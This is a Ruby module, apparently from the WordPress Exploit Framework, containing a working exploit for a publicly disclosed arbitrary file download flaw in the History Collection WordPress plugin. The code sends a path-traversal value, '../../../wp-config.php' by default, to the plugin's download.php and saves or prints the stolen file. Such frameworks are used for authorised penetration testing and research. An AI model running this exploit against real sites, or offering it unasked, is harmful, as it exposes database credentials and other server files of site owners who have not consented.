# frozen_string_literal: true

class Wpxf::Auxiliary::HistoryCollectionArbitraryFileDownload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'History Collection Arbitrary File Download',
      desc: %(
        This module exploits a vulnerability in all versions of the
        History Collection plugin which allows you to download any arbitrary
        file accessible by the user the web server is running as.
      ),
      author: [
        'Kuroi\'SH',                      # Disclosure
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['EDB', '37254']
      ],
      date: 'Jun 06 2015'
    )

    register_options([
      StringOption.new(
        name: 'remote_file',
        desc: 'The relative or absolute path to the remote file to download',
        required: true,
        default: '../../../wp-config.php'
      ),
      StringOption.new(
        name: 'export_path',
        desc: 'The file to save the file to',
        required: false
      )
    ])
  end

  def check
    check_plugin_version_from_readme('history-collection')
  end

  def remote_file
    normalized_option_value('remote_file')
  end

  def export_path
    return nil if normalized_option_value('export_path').nil?
    File.expand_path normalized_option_value('export_path')
  end

  def downloader_url
    normalize_uri(wordpress_url_plugins, 'history-collection', 'download.php')
  end

  def run
    return false unless super

    res = nil

    if export_path.nil?
      emit_info 'Requesting file...'
      res = execute_get_request(
        url: downloader_url,
        params: { 'var' => remote_file }
      )
    else
      emit_info 'Downloading file...'
      res = download_file(
        url: downloader_url,
        method: :get,
        params: { 'var' => remote_file },
        local_filename: export_path
      )
    end

    if res.nil? || res.timed_out?
      emit_error 'Request timed out, try increasing the http_client_timeout'
      return false
    end

    if res.code != 200
      emit_error "Server responded with code #{res.code}"
      return false
    end

    if export_path.nil?
      if res.body =~ /ERROR: File not found/i
        emit_error 'The remote file could not be found'
        return false
      else
        emit_success "Result: \n#{res.body}"
      end
    else
      emit_success "Downloaded file to #{export_path}"
    end

    true
  end
end
